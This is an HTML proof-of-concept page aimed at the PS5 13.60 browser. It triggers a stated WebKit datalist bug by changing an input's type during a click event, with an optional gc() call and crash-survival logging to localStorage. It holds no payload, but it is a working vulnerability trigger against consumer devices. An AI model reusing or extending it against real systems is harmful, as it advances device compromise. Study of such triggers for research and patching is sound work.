<!doctype html>
<meta charset="utf-8">
<title>PS5 13.60 - V36.1 CVE-2026-64783</title>

<style>
body {
    background:#101010;
    color:#eee;
    font:18px monospace;
    padding:24px;
}
input {
    width:420px;
    font:24px sans-serif;
    padding:14px;
}
#log {
    margin-top:25px;
    white-space:pre-wrap;
}
</style>

<h2>PS5 13.60 — V36.1</h2>
<p>CVE-2026-64783 / WebKit bug 313521</p>

<p>
Click the <b>datalist/dropdown indicator</b>
inside the input below.
</p>

<input id="target"
       type="text"
       list="values"
       placeholder="CLICK DROPDOWN INDICATOR">

<datalist id="values">
    <option value="TEST-A">
    <option value="TEST-B">
</datalist>

<pre id="log">STATUS: READY</pre>

<script>
"use strict";

const input = document.getElementById("target");
const log = document.getElementById("log");

let fired = false;

function add(s) {
    log.textContent += "\n" + s;

    try {
        localStorage.setItem("V361_LAST", s);
    } catch(e) {}
}

/*
 * Show the final checkpoint from a previous load.
 * Useful if WebContent dies and the browser reloads.
 */
try {
    const previous = localStorage.getItem("V361_LAST");

    if (previous)
        add("PREVIOUS LAST CHECKPOINT: " + previous);
} catch(e) {}

add("DATALIST PRESENT");
add("INPUT TYPE: " + input.type);
add("WAITING FOR GENUINE DATALIST CLICK");

input.addEventListener("click", function(event) {

    if (fired)
        return;

    fired = true;

    add("CLICK ENTERED");

    add("TYPE CHANGE START");

    input.type = "button";

    add("TYPE CHANGED: " + input.type);

    /*
     * The upstream LayoutTest calls gc() here.
     *
     * Ordinary webpages don't expose WebKit's
     * testing-only gc() function, so deliberately
     * don't fake it.
     */
    if (typeof gc === "function") {
        add("GC AVAILABLE");
        gc();
        add("GC RETURNED");
    } else {
        add("GC TEST API UNAVAILABLE");
    }

    add("CLICK LISTENER RETURNING");

}, { once:true });

/*
 * This runs only if execution survives the native
 * event/default-handler processing.
 */
setInterval(function() {

    if (!fired)
        return;

    if (input.type === "button") {
        add("PAGE SURVIVED NATIVE EVENT HANDLING");

        fired = false;
    }

}, 1000);
</script>
